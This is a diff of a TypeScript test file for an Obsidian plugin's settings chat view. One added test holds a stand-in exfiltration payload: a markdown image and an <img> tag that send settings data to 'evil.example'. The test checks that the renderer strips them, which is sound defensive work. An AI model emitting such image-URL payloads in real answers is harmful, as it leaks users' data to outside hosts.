@@ -2,13 +2,14 @@ import { describe, expect, it, vi } from "vitest";
 import "../src/i18n/strings";
 import { WorkspaceLeaf } from "./vendor/kit/obsidian-mock";
 import { ChatSession, type ChatSessionDeps } from "../src/obsidian/chat-session";
-import { SettingsChatView, VIEW_TYPE_SA_CHAT, type ChatViewDeps } from "../src/obsidian/chat-view";
+import { SettingsChatView, VIEW_TYPE_SA_CHAT, refreshChatViews, type ChatViewDeps } from "../src/obsidian/chat-view";
 
 const installed = [{ id: "koda-agent", name: "Koda" }, { id: "lingotuner", name: "Lingotuner" }];
 const profileAnswer = "Try this:\n```settings-profile\n" + JSON.stringify({ version: 1, plugins: { "koda-agent": { maxRounds: 20 } } }) + "\n```\nDone.";
 const broken = "```settings-profile\n{oops sk-DETAIL-LEAK\n```";
 
 function setup(opts: { endpoint?: boolean; answer?: string; send?: ChatSessionDeps["send"]; readSettings?: ChatSessionDeps["readSettings"] } = {}) {
+  const flag = { ok: opts.endpoint ?? true };
   const send: ChatSessionDeps["send"] = opts.send ?? (async (_m, _s, onDelta) => { onDelta({ content: "hi" }); return { ok: true, content: opts.answer ?? "plain answer" }; });
   const session = new ChatSession({
     send, installed: () => installed, describeEndpoint: () => ({ endpoint: "http://x", model: "m1" }),
@@ -17,7 +18,7 @@ function setup(opts: { endpoint?: boolean; answer?: string; send?: ChatSessionDe
   const service = { plan: vi.fn(async () => []), applyInteractive: vi.fn(async () => ({ cancelled: true as const })) };
   const deps: ChatViewDeps = {
     session, service, installed: () => installed,
-    resolveEndpoint: async () => opts.endpoint ?? true,
+    resolveEndpoint: async () => flag.ok,
     openOwnSettings: vi.fn(), openPluginSettings: vi.fn(),
     renderMarkdown: vi.fn(async (el: HTMLElement, md: string) => { el.setText(md); }),
     saveNote: vi.fn(async () => "Settings profile.md"),
@@ -26,7 +27,7 @@ function setup(opts: { endpoint?: boolean; answer?: string; send?: ChatSessionDe
     now: () => new Date(2026, 9, 3, 12, 0),
   };
   const view = new SettingsChatView(new WorkspaceLeaf() as never, deps);
-  return { view, deps, session, service };
+  return { view, deps, session, service, flag };
 }
 const buttons = (v: SettingsChatView) => (v.contentEl as any).querySelectorAll("button") as any[];
 const ask = async (v: SettingsChatView, text = "koda-agent rounds") => {
@@ -94,7 +95,7 @@ describe("chat-view", () => {
     await view.onOpen();
     session.selected = ["koda-agent", "lingotuner"];
     view.refresh();
-    const rm = buttons(view).filter((b) => b.getAttribute("aria-label") === "Remove koda-agent");
+    const rm = buttons(view).filter((b) => b.getAttribute("aria-label") === "Remove Koda");
     expect(rm.length).toBe(1);
     rm[0].click();
     expect(session.selected).toEqual(["lingotuner"]);
@@ -131,5 +132,37 @@ describe("chat-view", () => {
     await ask(view);
     expect((view.contentEl as any).textContent).toContain("Error: http 500");
     expect(service.applyInteractive).not.toHaveBeenCalled();
+  });
+
+  it("Empty-State wechselt nach Endpunkt-Auflösung in die Eingabe; refreshChatViews erreicht alle offenen Views", async () => {
+    const { view, flag } = setup({ endpoint: false });
+    await view.onOpen();
+    expect((view.contentEl as any).querySelectorAll("textarea").length).toBe(0);
+    flag.ok = true;
+    const leaf = new WorkspaceLeaf() as any;
+    leaf.view = view;
+    await refreshChatViews([leaf, new WorkspaceLeaf() as never]);
+    expect((view.contentEl as any).querySelectorAll("textarea").length).toBe(1);
+    expect((view.contentEl as any).querySelectorAll(".sa-empty").length).toBe(0);
+  });
+
+  it("Bild-URL in der Antwort erreicht den Renderer nie als Bildsyntax", async () => {
+    const { view, deps } = setup({ answer: "look ![x](https://evil.example/?q=maxRounds5) <img src=\"https://evil.example/a\">" });
+    await view.onOpen();
+    await ask(view);
+    await vi.waitFor(() => { expect(deps.renderMarkdown).toHaveBeenCalled(); });
+    const md = (deps.renderMarkdown as any).mock.calls.at(-1)[1] as string;
+    expect(md).not.toContain("![");
+    expect(md).not.toContain("<img");
+    const text = (view.contentEl as any).textContent as string;
+    expect(text).not.toContain("![");
+  });
+
+  it("ein unvollständiger Profilzaun wird nicht gerendert", async () => {
+    const { view, deps } = setup({ answer: "hi\n```settings-profile\n{\"version\":1" });
+    await view.onOpen();
+    await ask(view);
+    await vi.waitFor(() => { expect(deps.renderMarkdown).toHaveBeenCalled(); });
+    expect((deps.renderMarkdown as any).mock.calls.at(-1)[1]).not.toContain("settings-profile");
   });
 });
